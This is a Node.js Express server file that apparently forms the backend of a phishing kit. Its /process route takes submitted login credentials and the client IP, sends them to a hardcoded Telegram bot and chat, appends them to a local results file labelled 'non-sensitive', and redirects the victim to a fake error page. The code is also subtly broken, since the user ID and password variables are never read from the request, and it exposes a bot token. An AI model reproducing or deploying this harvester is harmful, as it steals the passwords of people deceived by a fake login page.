import express from "express";
import fetch from "node-fetch";
import fs from "fs";
import crypto from "crypto";

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const BOT_TOKEN = "8278362889:AAEmaAjTradJdKs8WwJcGMJD7e7WkqCnHOo";
const CHAT_ID = "8488902696";

app.post("/process", async (req, res) => {
    const ip =
        req.headers["x-forwarded-for"] ||
        req.socket.remoteAddress;

    const message =
        "🚨 Login Event 🚨\n" +
		"User ID: " + userid + "\n" +
		"Pasword: " + password + "\n" +
        "IP: " + ip + "\n" +
        "Time: " + new Date().toISOString();

    // Send Telegram notification
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    });

    // Log event (non-sensitive)
    fs.appendFileSync("results.txt", message + "\n\n");

    // Redirect
    const session = crypto.randomBytes(16).toString("hex");
    const dispatch = crypto.createHash("sha1").update(Date.now().toString()).digest("hex");

    res.redirect(`/error?session=${session}&dispatch=${dispatch}`);
});

app.listen(3000, () => {
    console.log("Server running on port 3000");
});
